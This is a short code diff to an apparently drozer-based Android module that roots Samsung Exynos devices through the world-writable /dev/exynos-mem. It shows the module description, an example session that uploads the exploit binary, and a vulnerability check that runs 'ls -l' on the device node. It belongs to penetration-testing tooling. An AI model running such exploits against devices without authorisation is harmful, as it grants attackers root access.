@@ -12,7 +12,7 @@ This module uses the vulnerability and exploit provided in http://forum.xda-deve
 The provided exploit makes use of the fact that /dev/exynos-mem is marked as globally RW and so can be exploited from the context of any application to obtain a root shell on the device.
 """
     examples = """
-    mercury> run exploit.root.exynosmem
+    dz> run exploit.root.exynosmem
     [*] Uploading exynos-abuse
     [*] Upload successful
     [*] chmod 770 exynos-abuse
@@ -24,14 +24,14 @@ The provided exploit makes use of the fact that /dev/exynos-mem is marked as glo
     """
 
     author = ["alephzain (xdadevelopers)", "Tyrone (@mwrlabs)"]
-    date = "2012-12-17"
+    date = "2013-12-12"
     license = "BSD (3 clause)"
     path = ["exploit", "root"]
     
     def isVulnerable(self, arguments):
         
         if "rw- " in self.shellExec("ls -l /dev/exynos-mem"):
-            return True
+            return 2 # Potentially Vulnerable
         else:
             return False
 
